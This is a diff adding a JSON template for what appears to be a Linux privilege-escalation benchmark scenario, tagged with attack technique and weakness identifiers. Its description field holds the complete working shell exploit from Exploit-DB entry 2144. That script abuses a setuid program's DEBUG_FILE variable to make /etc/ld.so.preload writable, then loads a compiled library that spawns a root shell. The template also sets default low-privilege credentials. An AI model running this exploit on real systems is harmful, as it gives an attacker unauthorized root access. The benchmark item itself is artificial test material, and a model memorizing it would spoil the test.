@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_2144",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: liblesstif 2-0.93.94-4mdk - 'DEBUG_FILE' Local Privilege Escalation\n\nExploit source code (2144.sh):\n```\n#!/bin/sh\necho\necho \"mtink libXm local root exploit\"\necho \"* karol@wiesek.pl *\"\necho\numask 000\nexport DEBUG_FILE=\"/etc/ld.so.preload\"\ncat > /tmp/lib.c << _EOF\n#include <unistd.h>\nvoid _init(void)\n{\n\tif (getuid()!=0 && geteuid()==0)\n\t{\n\t\tsetuid(0);\n\t\tunlink(\"/etc/ld.so.preload\");\n\t\texecl(\"/bin/bash\", \"bash\", 0);\n\t}\n}\n_EOF\n/usr/bin/gcc -o /tmp/lib.o -c /tmp/lib.c\n/usr/bin/ld -shared -o /tmp/lib.so /tmp/lib.o\n/usr/bin/mtink\necho \"/tmp/lib.so\" > /etc/ld.so.preload\n/bin/ping\n\n# milw0rm.com [2006-08-08]\n```",
+  "cve": "",
+  "exploitdb_id": "2144",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_2144",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
